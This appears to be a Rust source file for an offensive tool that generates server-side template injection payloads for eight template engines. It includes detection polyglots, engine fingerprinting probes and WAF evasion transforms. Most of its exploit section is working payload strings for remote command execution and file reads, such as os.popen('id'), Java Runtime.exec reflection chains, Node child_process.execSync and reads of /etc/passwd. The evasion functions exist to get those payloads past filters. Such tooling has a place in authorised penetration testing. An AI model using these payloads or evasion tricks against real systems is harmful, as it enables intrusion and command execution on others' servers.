/// SSTI polyglot payload generator for multi-engine template injection detection and exploitation.
///
/// Supports 8 template engines (Jinja2, Twig, Freemarker, Mako, ERB, Handlebars, Velocity, Pebble)
/// with detection polyglots, engine fingerprinting, engine-specific exploit chains, and WAF evasion.
use std::collections::HashMap;
use std::fmt;

/// Supported server-side template engines.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TemplateEngine {
    Jinja2,
    Twig,
    Freemarker,
    Mako,
    Erb,
    Handlebars,
    Velocity,
    Pebble,
}

impl fmt::Display for TemplateEngine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Jinja2 => write!(f, "Jinja2"),
            Self::Twig => write!(f, "Twig"),
            Self::Freemarker => write!(f, "Freemarker"),
            Self::Mako => write!(f, "Mako"),
            Self::Erb => write!(f, "ERB"),
            Self::Handlebars => write!(f, "Handlebars"),
            Self::Velocity => write!(f, "Velocity"),
            Self::Pebble => write!(f, "Pebble"),
        }
    }
}

impl TemplateEngine {
    pub const ALL: &'static [TemplateEngine] = &[
        Self::Jinja2,
        Self::Twig,
        Self::Freemarker,
        Self::Mako,
        Self::Erb,
        Self::Handlebars,
        Self::Velocity,
        Self::Pebble,
    ];
}

/// WAF evasion encoding technique applied to a payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum EvasionTechnique {
    UnicodeNormalization,
    HtmlEntityEncoding,
    UrlEncoding,
    WhitespaceInsertion,
    CommentInjection,
    ConcatenationSplit,
    CaseAlternation,
    DoubleUrlEncoding,
    BackslashEscape,
    NullByteInsertion,
}

impl fmt::Display for EvasionTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnicodeNormalization => write!(f, "unicode-normalization"),
            Self::HtmlEntityEncoding => write!(f, "html-entity-encoding"),
            Self::UrlEncoding => write!(f, "url-encoding"),
            Self::WhitespaceInsertion => write!(f, "whitespace-insertion"),
            Self::CommentInjection => write!(f, "comment-injection"),
            Self::ConcatenationSplit => write!(f, "concatenation-split"),
            Self::CaseAlternation => write!(f, "case-alternation"),
            Self::DoubleUrlEncoding => write!(f, "double-url-encoding"),
            Self::BackslashEscape => write!(f, "backslash-escape"),
            Self::NullByteInsertion => write!(f, "null-byte-insertion"),
        }
    }
}

/// A single SSTI payload with metadata about which engine(s) it targets.
#[derive(Debug, Clone)]
pub struct SstiPayload {
    pub raw: String,
    pub engine: Option<TemplateEngine>,
    pub category: PayloadCategory,
    pub evasion: Option<EvasionTechnique>,
    pub expected_output: Option<String>,
    pub description: String,
}

/// Payload purpose within the SSTI testing lifecycle.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadCategory {
    Detection,
    Fingerprint,
    Exploitation,
    Evasion,
}

/// Result of analyzing an HTTP response body against SSTI fingerprints.
#[derive(Debug, Clone)]
pub struct FingerprintResult {
    pub engine: TemplateEngine,
    pub confidence: f64,
    pub matched_pattern: String,
}

/// Core polyglot engine that generates payloads across the SSTI testing lifecycle.
pub struct SstiPolyglotEngine {
    detection_payloads: Vec<SstiPayload>,
    fingerprint_map: HashMap<TemplateEngine, Vec<FingerprintRule>>,
    exploit_chains: HashMap<TemplateEngine, Vec<SstiPayload>>,
    evasion_registry: HashMap<TemplateEngine, Vec<EvasionTechnique>>,
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
struct FingerprintRule {
    probe: String,
    expected_substring: String,
    confidence: f64,
    description: String,
}

impl Default for SstiPolyglotEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl SstiPolyglotEngine {
    pub fn new() -> Self {
        let mut engine = Self {
            detection_payloads: Vec::new(),
            fingerprint_map: HashMap::new(),
            exploit_chains: HashMap::new(),
            evasion_registry: HashMap::new(),
        };
        engine.register_detection_payloads();
        engine.register_fingerprint_rules();
        engine.register_exploit_chains();
        engine.register_evasion_techniques();
        engine
    }

    /// Multi-engine detection polyglot: a single string that evaluates differently
    /// across Jinja2, Twig, Freemarker, Mako, ERB, Handlebars, Velocity, and Pebble.
    pub fn detection_polyglot(&self) -> &str {
        "${{<%[%'\"}}%\\.<>{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}{{=7*7}}#set($x=7*7)$x"
    }

    /// All detection-phase payloads (individual per-engine plus the polyglot).
    pub fn detection_payloads(&self) -> &[SstiPayload] {
        &self.detection_payloads
    }

    /// Fingerprint a template engine from the HTTP response body after sending a detection probe.
    pub fn fingerprint_response(&self, response_body: &str) -> Vec<FingerprintResult> {
        let mut results = Vec::new();

        for (engine, rules) in &self.fingerprint_map {
            for rule in rules {
                if response_body.contains(&rule.expected_substring) {
                    results.push(FingerprintResult {
                        engine: *engine,
                        confidence: rule.confidence,
                        matched_pattern: rule.expected_substring.clone(),
                    });
                }
            }
        }

        results.sort_by(|a, b| {
            b.confidence
                .partial_cmp(&a.confidence)
                .unwrap_or(std::cmp::Ordering::Equal)
        });
        results
    }

    /// Engine-specific exploit chain payloads.
    pub fn exploit_payloads(&self, engine: TemplateEngine) -> Vec<&SstiPayload> {
        self.exploit_chains
            .get(&engine)
            .map(|v| v.iter().collect())
            .unwrap_or_default()
    }

    /// All exploit payloads across every engine.
    pub fn all_exploit_payloads(&self) -> Vec<&SstiPayload> {
        self.exploit_chains
            .values()
            .flat_map(|v| v.iter())
            .collect()
    }

    /// WAF evasion variants for a given engine and base payload.
    pub fn evade(&self, engine: TemplateEngine, base_payload: &str) -> Vec<SstiPayload> {
        let techniques = match self.evasion_registry.get(&engine) {
            Some(t) => t,
            None => return vec![],
        };

        techniques
            .iter()
            .map(|technique| {
                let evaded = apply_evasion(*technique, engine, base_payload);
                SstiPayload {
                    raw: evaded,
                    engine: Some(engine),
                    category: PayloadCategory::Evasion,
                    evasion: Some(*technique),
                    expected_output: None,
                    description: format!("{} evasion of {} payload", technique, engine),
                }
            })
            .collect()
    }

    /// Evasion techniques registered for a given engine.
    pub fn evasion_techniques(&self, engine: TemplateEngine) -> &[EvasionTechnique] {
        self.evasion_registry
            .get(&engine)
            .map(|v| v.as_slice())
            .unwrap_or(&[])
    }

    /// Count of supported engines.
    pub fn supported_engine_count(&self) -> usize {
        TemplateEngine::ALL.len()
    }

    /// Fingerprint probes for a specific engine (returns the raw probe strings).
    pub fn fingerprint_probes(&self, engine: TemplateEngine) -> Vec<String> {
        self.fingerprint_map
            .get(&engine)
            .map(|rules| rules.iter().map(|r| r.probe.clone()).collect())
            .unwrap_or_default()
    }

    fn register_detection_payloads(&mut self) {
        let payloads = vec![
            SstiPayload {
                raw: self.detection_polyglot().to_string(),
                engine: None,
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: None,
                description: "Universal polyglot triggering 8+ engines".into(),
            },
            SstiPayload {
                raw: "{{7*7}}".into(),
                engine: Some(TemplateEngine::Jinja2),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("49".into()),
                description: "Jinja2/Twig double-curly math eval".into(),
            },
            SstiPayload {
                raw: "{{7*'7'}}".into(),
                engine: Some(TemplateEngine::Twig),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("49".into()),
                description: "Twig numeric coercion (returns 49, not 7777777 like Jinja2)".into(),
            },
            SstiPayload {
                raw: "${7*7}".into(),
                engine: Some(TemplateEngine::Freemarker),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("49".into()),
                description: "Freemarker/Mako dollar-curly math eval".into(),
            },
            SstiPayload {
                raw: "#{7*7}".into(),
                engine: Some(TemplateEngine::Pebble),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("49".into()),
                description: "Pebble hash-curly math eval".into(),
            },
            SstiPayload {
                raw: "<%= 7*7 %>".into(),
                engine: Some(TemplateEngine::Erb),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("49".into()),
                description: "ERB angle-bracket-percent math eval".into(),
            },
            SstiPayload {
                raw: "{7*7}".into(),
                engine: Some(TemplateEngine::Velocity),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: None,
                description: "Velocity single-curly eval attempt".into(),
            },
            SstiPayload {
                raw: "{{=7*7}}".into(),
                engine: Some(TemplateEngine::Handlebars),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: None,
                description: "Handlebars triple-stache-equals eval attempt".into(),
            },
            SstiPayload {
                raw: "${7*'7'}".into(),
                engine: Some(TemplateEngine::Mako),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("7777777".into()),
                description: "Mako string multiplication detection".into(),
            },
            SstiPayload {
                raw: "{{7*'7'}}".into(),
                engine: Some(TemplateEngine::Jinja2),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("7777777".into()),
                description: "Jinja2 string multiplication (disambiguates from Twig)".into(),
            },
            SstiPayload {
                raw: "#set($x=7*7)${x}".into(),
                engine: Some(TemplateEngine::Velocity),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("49".into()),
                description: "Velocity variable assignment and interpolation".into(),
            },
            SstiPayload {
                raw: "{{\"foo\".toUpperCase()}}".into(),
                engine: Some(TemplateEngine::Pebble),
                category: PayloadCategory::Detection,
                evasion: None,
                expected_output: Some("FOO".into()),
                description: "Pebble Java method invocation detection".into(),
            },
        ];
        self.detection_payloads = payloads;
    }

    fn register_fingerprint_rules(&mut self) {
        self.fingerprint_map.insert(
            TemplateEngine::Jinja2,
            vec![
                FingerprintRule {
                    probe: "{{7*'7'}}".into(),
                    expected_substring: "7777777".into(),
                    confidence: 0.95,
                    description: "Jinja2 string repetition (Python semantics)".into(),
                },
                FingerprintRule {
                    probe: "{{config}}".into(),
                    expected_substring: "<Config".into(),
                    confidence: 0.90,
                    description: "Jinja2 Flask config object leak".into(),
                },
                FingerprintRule {
                    probe: "{{self.__class__}}".into(),
                    expected_substring: "TemplateReference".into(),
                    confidence: 0.85,
                    description: "Jinja2 self class introspection".into(),
                },
            ],
        );

        self.fingerprint_map.insert(
            TemplateEngine::Twig,
            vec![
                FingerprintRule {
                    probe: "{{7*'7'}}".into(),
                    expected_substring: "49".into(),
                    confidence: 0.90,
                    description: "Twig numeric coercion (PHP semantics)".into(),
                },
                FingerprintRule {
                    probe: "{{_self}}".into(),
                    expected_substring: "Template".into(),
                    confidence: 0.80,
                    description: "Twig self reference object".into(),
                },
                FingerprintRule {
                    probe: "{{dump()}}".into(),
                    expected_substring: "NULL".into(),
                    confidence: 0.75,
                    description: "Twig dump function output".into(),
                },
            ],
        );

        self.fingerprint_map.insert(
            TemplateEngine::Freemarker,
            vec![
                FingerprintRule {
                    probe: "${\"freemarker.template.utility.ObjectConstructor\"?new()}".into(),
                    expected_substring: "freemarker".into(),
                    confidence: 0.95,
                    description: "Freemarker class instantiation".into(),
                },
                FingerprintRule {
                    probe: "${.version}".into(),
                    expected_substring: "2.".into(),
                    confidence: 0.90,
                    description: "Freemarker version leak".into(),
                },
                FingerprintRule {
                    probe: "<#assign x=7*7>${x}".into(),
                    expected_substring: "49".into(),
                    confidence: 0.85,
                    description: "Freemarker directive-based assignment".into(),
                },
            ],
        );

        self.fingerprint_map.insert(
            TemplateEngine::Mako,
            vec![
                FingerprintRule {
                    probe: "${7*7}".into(),
                    expected_substring: "49".into(),
                    confidence: 0.70,
                    description: "Mako dollar-curly math (shared with Freemarker)".into(),
                },
                FingerprintRule {
                    probe: "${type(self).__name__}".into(),
                    expected_substring: "Context".into(),
                    confidence: 0.90,
                    description: "Mako Python context object type".into(),
                },
                FingerprintRule {
                    probe: "${self.module.__name__}".into(),
                    expected_substring: "memory".into(),
                    confidence: 0.85,
                    description: "Mako module introspection".into(),
                },
            ],
        );

        self.fingerprint_map.insert(
            TemplateEngine::Erb,
            vec![
                FingerprintRule {
                    probe: "<%= 7*7 %>".into(),
                    expected_substring: "49".into(),
                    confidence: 0.80,
                    description: "ERB basic math eval".into(),
                },
                FingerprintRule {
                    probe: "<%= self.class %>".into(),
                    expected_substring: "Binding".into(),
                    confidence: 0.90,
                    description: "ERB Ruby binding class leak".into(),
                },
                FingerprintRule {
                    probe: "<%= RUBY_VERSION %>".into(),
                    expected_substring: "ruby".into(),
                    confidence: 0.75,
                    description: "ERB Ruby version constant".into(),
                },
            ],
        );

        self.fingerprint_map.insert(
            TemplateEngine::Handlebars,
            vec![
                FingerprintRule {
                    probe: "{{this}}".into(),
                    expected_substring: "[object".into(),
                    confidence: 0.75,
                    description: "Handlebars this-context object dump".into(),
                },
                FingerprintRule {
                    probe: "{{constructor.constructor}}".into(),
                    expected_substring: "function".into(),
                    confidence: 0.85,
                    description: "Handlebars prototype chain access".into(),
                },
                FingerprintRule {
                    probe: "{{#each this}}{{@key}}{{/each}}".into(),
                    expected_substring: "settings".into(),
                    confidence: 0.70,
                    description: "Handlebars context key enumeration".into(),
                },
            ],
        );

        self.fingerprint_map.insert(
            TemplateEngine::Velocity,
            vec![
                FingerprintRule {
                    probe: "#set($x=7*7)$x".into(),
                    expected_substring: "49".into(),
                    confidence: 0.90,
                    description: "Velocity variable assignment math".into(),
                },
                FingerprintRule {
                    probe: "$class.inspect('java.lang.Runtime')".into(),
                    expected_substring: "Runtime".into(),
                    confidence: 0.85,
                    description: "Velocity Java runtime reflection".into(),
                },
                FingerprintRule {
                    probe: "$!null".into(),
                    expected_substring: "$!null".into(),
                    confidence: 0.60,
                    description:
                        "Velocity quiet null reference (literal passthrough indicates non-Velocity)"
                            .into(),
                },
            ],
        );

        self.fingerprint_map.insert(
            TemplateEngine::Pebble,
            vec![
                FingerprintRule {
                    probe: "{{\"foo\".toUpperCase()}}".into(),
                    expected_substring: "FOO".into(),
                    confidence: 0.90,
                    description: "Pebble Java method call on string".into(),
                },
                FingerprintRule {
                    probe: "{% set x = 7 * 7 %}{{x}}".into(),
                    expected_substring: "49".into(),
                    confidence: 0.80,
                    description: "Pebble set-tag variable assignment".into(),
                },
                FingerprintRule {
                    probe: "{{beans}}".into(),
                    expected_substring: "java".into(),
                    confidence: 0.85,
                    description: "Pebble Spring beans access".into(),
                },
            ],
        );
    }

    fn register_exploit_chains(&mut self) {
        self.exploit_chains.insert(TemplateEngine::Jinja2, vec![
            SstiPayload {
                raw: "{{ ''.__class__.__mro__[2].__subclasses__() }}".into(),
                engine: Some(TemplateEngine::Jinja2),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Jinja2 MRO subclass enumeration via empty string".into(),
            },
            SstiPayload {
                raw: "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}".into(),
                engine: Some(TemplateEngine::Jinja2),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Jinja2 file read via subprocess.Popen from MRO chain".into(),
            },
            SstiPayload {
                raw: "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}".into(),
                engine: Some(TemplateEngine::Jinja2),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Jinja2 RCE via config globals os module".into(),
            },
            SstiPayload {
                raw: "{{ request.__class__.__mro__[3].__subclasses__() | selectattr('__name__','eq','Popen') | list | first }}".into(),
                engine: Some(TemplateEngine::Jinja2),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Jinja2 Popen location via selectattr filter chain".into(),
            },
        ]);

        self.exploit_chains.insert(TemplateEngine::Twig, vec![
            SstiPayload {
                raw: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}".into(),
                engine: Some(TemplateEngine::Twig),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Twig RCE via registerUndefinedFilterCallback".into(),
            },
            SstiPayload {
                raw: "{{['id']|filter('system')}}".into(),
                engine: Some(TemplateEngine::Twig),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Twig RCE via filter('system') on array".into(),
            },
            SstiPayload {
                raw: "{{'/etc/passwd'|file_excerpt(0,100)}}".into(),
                engine: Some(TemplateEngine::Twig),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Twig file read via file_excerpt filter".into(),
            },
        ]);

        self.exploit_chains.insert(TemplateEngine::Freemarker, vec![
            SstiPayload {
                raw: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}".into(),
                engine: Some(TemplateEngine::Freemarker),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Freemarker RCE via Execute utility class".into(),
            },
            SstiPayload {
                raw: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}".into(),
                engine: Some(TemplateEngine::Freemarker),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Freemarker RCE via assigned Execute variable".into(),
            },
            SstiPayload {
                raw: "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\").start()}".into(),
                engine: Some(TemplateEngine::Freemarker),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Freemarker RCE via ProcessBuilder through ObjectConstructor".into(),
            },
        ]);

        self.exploit_chains.insert(
            TemplateEngine::Mako,
            vec![
                SstiPayload {
                    raw: "${__import__('os').popen('id').read()}".into(),
                    engine: Some(TemplateEngine::Mako),
                    category: PayloadCategory::Exploitation,
                    evasion: None,
                    expected_output: None,
                    description: "Mako RCE via direct os.popen import".into(),
                },
                SstiPayload {
                    raw: "${open('/etc/passwd').read()}".into(),
                    engine: Some(TemplateEngine::Mako),
                    category: PayloadCategory::Exploitation,
                    evasion: None,
                    expected_output: None,
                    description: "Mako file read via built-in open".into(),
                },
                SstiPayload {
                    raw: "<%\nimport os\nresult = os.popen('id').read()\n%>${result}".into(),
                    engine: Some(TemplateEngine::Mako),
                    category: PayloadCategory::Exploitation,
                    evasion: None,
                    expected_output: None,
                    description: "Mako block-level Python import and exec".into(),
                },
            ],
        );

        self.exploit_chains.insert(
            TemplateEngine::Erb,
            vec![
                SstiPayload {
                    raw: "<%= system('id') %>".into(),
                    engine: Some(TemplateEngine::Erb),
                    category: PayloadCategory::Exploitation,
                    evasion: None,
                    expected_output: None,
                    description: "ERB RCE via system() call".into(),
                },
                SstiPayload {
                    raw: "<%= `id` %>".into(),
                    engine: Some(TemplateEngine::Erb),
                    category: PayloadCategory::Exploitation,
                    evasion: None,
                    expected_output: None,
                    description: "ERB RCE via backtick shell exec".into(),
                },
                SstiPayload {
                    raw: "<%= IO.popen('id').read %>".into(),
                    engine: Some(TemplateEngine::Erb),
                    category: PayloadCategory::Exploitation,
                    evasion: None,
                    expected_output: None,
                    description: "ERB RCE via IO.popen".into(),
                },
            ],
        );

        self.exploit_chains.insert(TemplateEngine::Handlebars, vec![
            SstiPayload {
                raw: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}".into(),
                engine: Some(TemplateEngine::Handlebars),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Handlebars prototype pollution RCE via constructor chain".into(),
            },
            SstiPayload {
                raw: "{{constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\")')()}}".into(),
                engine: Some(TemplateEngine::Handlebars),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Handlebars RCE via constructor.constructor".into(),
            },
            SstiPayload {
                raw: "{{#each (lookup this 'constructor')}}{{#if (lookup this 'call')}}{{this 'return global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString()'}}{{/if}}{{/each}}".into(),
                engine: Some(TemplateEngine::Handlebars),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Handlebars RCE via _load and constructor iteration".into(),
            },
        ]);

        self.exploit_chains.insert(TemplateEngine::Velocity, vec![
            SstiPayload {
                raw: "#set($e=\"exp\")$e.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")".into(),
                engine: Some(TemplateEngine::Velocity),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Velocity RCE via Runtime.exec reflection".into(),
            },
            SstiPayload {
                raw: "#set($s=\"\")#set($rt=$s.class.forName(\"java.lang.Runtime\"))#set($chr=$s.class.forName(\"java.lang.Character\"))#set($str=$s.class.forName(\"java.lang.String\"))#set($ex=$rt.getRuntime().exec(\"id\"))$ex".into(),
                engine: Some(TemplateEngine::Velocity),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Velocity multi-stage reflection chain for RCE".into(),
            },
            SstiPayload {
                raw: "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($obj=$rt.getMethod('getRuntime',null).invoke(null,null))##\n#set($proc=$obj.exec('id'))##\n$proc".into(),
                engine: Some(TemplateEngine::Velocity),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Velocity invoke-based Runtime exec via Method.invoke".into(),
            },
        ]);

        self.exploit_chains.insert(TemplateEngine::Pebble, vec![
            SstiPayload {
                raw: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length)}}".into(),
                engine: Some(TemplateEngine::Pebble),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Pebble RCE via integer TYPE reflection to Runtime".into(),
            },
            SstiPayload {
                raw: "{{ beans.get('environment').getProperty('java.class.path') }}".into(),
                engine: Some(TemplateEngine::Pebble),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Pebble Spring beans property access for info disclosure".into(),
            },
            SstiPayload {
                raw: "{% set runtime = beans.get('applicationContext').getBean('org.springframework.boot.autoconfigure.web.ServerProperties').class.forName('java.lang.Runtime') %}{% set process = runtime.getMethod('exec', 'id'.class).invoke(runtime.getMethod('getRuntime').invoke(null), 'id') %}{{process}}".into(),
                engine: Some(TemplateEngine::Pebble),
                category: PayloadCategory::Exploitation,
                evasion: None,
                expected_output: None,
                description: "Pebble RCE via Spring applicationContext bean".into(),
            },
        ]);
    }

    fn register_evasion_techniques(&mut self) {
        self.evasion_registry.insert(
            TemplateEngine::Jinja2,
            vec![
                EvasionTechnique::UnicodeNormalization,
                EvasionTechnique::ConcatenationSplit,
                EvasionTechnique::WhitespaceInsertion,
                EvasionTechnique::UrlEncoding,
                EvasionTechnique::BackslashEscape,
            ],
        );

        self.evasion_registry.insert(
            TemplateEngine::Twig,
            vec![
                EvasionTechnique::HtmlEntityEncoding,
                EvasionTechnique::UrlEncoding,
                EvasionTechnique::CommentInjection,
                EvasionTechnique::ConcatenationSplit,
            ],
        );

        self.evasion_registry.insert(
            TemplateEngine::Freemarker,
            vec![
                EvasionTechnique::UrlEncoding,
                EvasionTechnique::ConcatenationSplit,
                EvasionTechnique::WhitespaceInsertion,
                EvasionTechnique::CaseAlternation,
            ],
        );

        self.evasion_registry.insert(
            TemplateEngine::Mako,
            vec![
                EvasionTechnique::UnicodeNormalization,
                EvasionTechnique::HtmlEntityEncoding,
                EvasionTechnique::ConcatenationSplit,
                EvasionTechnique::BackslashEscape,
            ],
        );

        self.evasion_registry.insert(
            TemplateEngine::Erb,
            vec![
                EvasionTechnique::WhitespaceInsertion,
                EvasionTechnique::ConcatenationSplit,
                EvasionTechnique::UrlEncoding,
                EvasionTechnique::CaseAlternation,
            ],
        );

        self.evasion_registry.insert(
            TemplateEngine::Handlebars,
            vec![
                EvasionTechnique::UnicodeNormalization,
                EvasionTechnique::UrlEncoding,
                EvasionTechnique::WhitespaceInsertion,
                EvasionTechnique::NullByteInsertion,
            ],
        );

        self.evasion_registry.insert(
            TemplateEngine::Velocity,
            vec![
                EvasionTechnique::WhitespaceInsertion,
                EvasionTechnique::CommentInjection,
                EvasionTechnique::ConcatenationSplit,
                EvasionTechnique::DoubleUrlEncoding,
            ],
        );

        self.evasion_registry.insert(
            TemplateEngine::Pebble,
            vec![
                EvasionTechnique::UrlEncoding,
                EvasionTechnique::WhitespaceInsertion,
                EvasionTechnique::ConcatenationSplit,
                EvasionTechnique::HtmlEntityEncoding,
            ],
        );
    }
}

/// Apply a single evasion technique to a payload string for a given engine.
fn apply_evasion(technique: EvasionTechnique, engine: TemplateEngine, payload: &str) -> String {
    match technique {
        EvasionTechnique::UnicodeNormalization => payload
            .replace("class", "cl\u{0307}ass")
            .replace("__", "\u{FF3F}\u{FF3F}"),
        EvasionTechnique::HtmlEntityEncoding => payload
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;")
            .replace('\'', "&#x27;"),
        EvasionTechnique::UrlEncoding => payload
            .replace('{', "%7B")
            .replace('}', "%7D")
            .replace('<', "%3C")
            .replace('>', "%3E")
            .replace('#', "%23"),
        EvasionTechnique::WhitespaceInsertion => match engine {
            TemplateEngine::Jinja2 | TemplateEngine::Twig | TemplateEngine::Pebble => {
                payload.replace("{{", "{{\t").replace("}}", "\t}}")
            }
            TemplateEngine::Erb => payload.replace("<%=", "<%=\t").replace("%>", "\t%>"),
            TemplateEngine::Velocity => payload.replace("#set(", "#set (\t"),
            _ => payload.replace("(", "( ").replace(")", " )"),
        },
        EvasionTechnique::CommentInjection => match engine {
            TemplateEngine::Twig | TemplateEngine::Jinja2 => {
                payload.replace("{{", "{{%- -%}}{%- -%}")
            }
            TemplateEngine::Velocity => payload.replace("#set", "#*comment*#set"),
            _ => payload.replace("(", "(/**/"),
        },
        EvasionTechnique::ConcatenationSplit => match engine {
            TemplateEngine::Jinja2 => payload
                .replace("'os'", "'o'+'s'")
                .replace("\"os\"", "\"o\"+\"s\""),
            TemplateEngine::Twig => payload
                .replace("'system'", "'sys'~'tem'")
                .replace("\"exec\"", "\"ex\"~\"ec\""),
            TemplateEngine::Freemarker => payload.replace("\"id\"", "\"i\"+\"d\""),
            TemplateEngine::Mako => payload
                .replace("'os'", "'o'+'s'")
                .replace("'id'", "'i'+'d'"),
            TemplateEngine::Erb => payload.replace("'id'", "'i'+'d'"),
            TemplateEngine::Velocity => payload.replace("\"id\"", "\"i\"+\"d\""),
            TemplateEngine::Pebble => payload.replace("'id'", "'i'+'d'"),
            TemplateEngine::Handlebars => payload.to_string(),
        },
        EvasionTechnique::CaseAlternation => {
            let mut result = String::with_capacity(payload.len());
            for (i, ch) in payload.chars().enumerate() {
                if ch.is_alphabetic() {
                    if i % 2 == 0 {
                        result.extend(ch.to_uppercase());
                    } else {
                        result.extend(ch.to_lowercase());
                    }
                } else {
                    result.push(ch);
                }
            }
            result
        }
        EvasionTechnique::DoubleUrlEncoding => payload
            .replace('{', "%257B")
            .replace('}', "%257D")
            .replace('<', "%253C")
            .replace('>', "%253E")
            .replace('#', "%2523"),
        EvasionTechnique::BackslashEscape => payload
            .replace("__", "\\x5f\\x5f")
            .replace("class", "\\x63lass"),
        EvasionTechnique::NullByteInsertion => {
            payload.replace("{{", "{{\x00{").replace("}}", "}\x00}}")
        }
    }
}
